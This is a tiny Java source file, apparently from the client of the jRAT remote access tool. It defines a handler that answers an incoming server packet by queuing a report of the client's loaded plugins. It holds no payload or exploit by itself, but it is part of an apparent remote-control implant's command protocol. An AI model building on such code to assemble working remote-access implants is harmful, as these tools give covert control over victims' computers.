package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet16LoadedPlugins;

public class Packet89LoadedPlugins extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.addToSendQueue(new Packet16LoadedPlugins());
	}

}
